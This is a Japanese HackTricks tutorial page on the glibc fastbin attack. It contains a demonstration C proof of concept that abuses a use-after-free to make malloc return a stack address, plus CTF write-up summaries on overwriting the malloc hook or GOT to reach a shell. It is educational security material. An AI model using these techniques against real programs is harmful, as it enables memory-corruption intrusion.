# ファストビン攻撃

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**か**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出**してください。

</details>

## 基本情報

ファストビンについての詳細情報は、次のページを参照してください:

{% content-ref url="bins-and-memory-allocations.md" %}
[bins-and-memory-allocations.md](bins-and-memory-allocations.md)
{% endcontent-ref %}

ファストビンはシングルリンクなので、他のビンよりも保護が少なく、**解放されたファストビンチャンク内のアドレスを変更するだけで**、**後で任意のメモリアドレスにチャンクを割り当てる**ことができます。

要約すると:

{% code overflow="wrap" %}
```c
ptr0 = malloc(0x20);
ptr1 = malloc(0x20);

// Put them in fast bin (suppose tcache is full)
free(ptr0)
free(ptr1)

// Use-after-free
// Modify the address where the free chunk of ptr1 is pointing
*ptr1 = (unsigned long)((char *)&<address>);

ptr2 = malloc(0x20); // This will get ptr1
ptr3 = malloc(0x20); // This will get a chunk in the <address> which could be abuse to overwrite arbitrary content inside of it
```
{% endcode %}

詳しいコードの完全な例は、[https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html) から見つけることができます。
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
puts("Today we will be discussing a fastbin attack.");
puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

puts("Let's start, we will allocate three chunks of size 0x30\n");
unsigned long *ptr0, *ptr1, *ptr2;

ptr0 = malloc(0x30);
ptr1 = malloc(0x30);
ptr2 = malloc(0x30);

printf("Chunk 0: %p\n", ptr0);
printf("Chunk 1: %p\n", ptr1);
printf("Chunk 2: %p\n\n", ptr2);


printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

int stackVar = 0x55;

printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);

printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

char *data0 = "00000000";
char *data1 = "11111111";
char *data2 = "22222222";

memcpy(ptr0, data0, 0x8);
memcpy(ptr1, data1, 0x8);
memcpy(ptr2, data2, 0x8);

printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

printf("Chunk 0: %s\n", (char *)ptr0);
printf("Chunk 1: %s\n", (char *)ptr1);
printf("Chunk 2: %s\n\n", (char *)ptr2);

printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

free(ptr0);
free(ptr1);
free(ptr2);

printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

*ptr1 = (unsigned long)((char *)&stackVar);

printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

unsigned long *ptr3, *ptr4, *ptr5;

ptr3 = malloc(0x30);
ptr4 = malloc(0x30);
ptr5 = malloc(0x30);

printf("Chunk 3: %p\n", ptr3);
printf("Chunk 4: %p\n", ptr4);
printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);

printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}
```
{% hint style="danger" %}
もしグローバル変数 **`global_max_fast`** の値を大きな数値で上書きできる場合、これによりより大きなサイズの fast bin を生成することが可能となり、以前は不可能だったシナリオで fast bin 攻撃を実行することができるかもしれません。
{% endhint %}

## 例

* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html)**:**
* チャンクを割り当て、解放し、その内容を読み取り、溢れた脆弱性を利用してそれらを埋めることが可能です。
* **情報リークのためのチャンクの統合**: このテクニックは、オーバーフローを悪用して偽の prev\_size を作成し、1つ前のチャンクをより大きなチャンクの中に配置することで、別のチャンクを含むより大きなチャンクを割り当てると、そのデータを印刷し、libc のアドレス (main\_arena+88) をリークさせることが可能です。
* **malloc フックの上書き**: これにより、前述の重複状況を悪用することで、同じメモリを指す2つのチャンクを持つことが可能でした。したがって、それらを両方解放し (保護を回避するために間に別のチャンクを解放)、同じチャンクを fast bin に2回持つことが可能でした。その後、再度それを割り当て、次のチャンクのアドレスを malloc\_hook の直前を指すように上書きし (これにより malloc が空きサイズとして考える整数を指す - 別のバイパス)、再度それを割り当て、そして malloc フックにアドレスを受け取る別のチャンクを割り当てることが可能でした。最後に **one gadget** がそこに書き込まれました。
* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html)**:**
* ヒープオーバーフローとユーザーによる解放、そしてダブルフリーがあります。チャンクが解放されると、ポインタを再利用して再度解放することが可能です。
* **Libc 情報リーク**: いくつかのチャンクを解放すると、メインアリーナの一部の場所を指すポインタが得られます。解放されたポインタを再利用できるため、このアドレスを読み取ることができます。
* **Fast bin 攻撃**: 割り当てられたポインタはすべて配列内に格納されているため、いくつかの fast bin チャンクを解放し、最後のチャンクでアドレスを上書きしてこのポインタ配列の直前を指すようにします。その後、同じサイズのいくつかのチャンクを割り当てると、最初に正規のチャンクが得られ、その後にポインタ配列を含む偽のチャンクが得られます。これにより、この割り当てポインタを `free` の got アドレスを指すように上書きし、その後チャンク 1 `"/bin/sh"` を書き込んで `free(chunk1)` を実行すると `system("/bin/sh")` が実行されます。
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html)
* 1バイトのオーバーフローを悪用して未整列のビン内のチャンクを統合し、libc 情報リークを取得し、その後 fast bin 攻撃を実行して malloc フックを one gadget アドレスで上書きする例です。
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html)
* 未整列のビンを悪用した情報リークと UAF を利用して libc アドレスと PIE アドレスをリークし、この CTF のエクスプロイトでは fast bin 攻撃を使用して制御されたチャンクのポインタが存在する場所にチャンクを割り当て、特定のポインタを上書きして GOT に one gadget を書き込むことが可能でした。
* 未整列のビン攻撃を介して悪用された Fast Bin 攻撃を見つけることができます:
* Fast Bin 攻撃を実行する前に、必要に応じて libc/ヒープアドレスをリークするために未整列リストを悪用することが一般的であることに注意してください。

{% content-ref url="unsorted-bin-attack.md" %}
[unsorted-bin-attack.md](unsorted-bin-attack.md)
{% endcontent-ref %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)** で**AWS hacking**をゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>!</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**、または **HackTricks を PDF でダウンロード** したい場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式 PEASS & HackTricks スワッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを発見する
* **💬 Discord グループ** に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローする
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングトリックを共有する

</details>
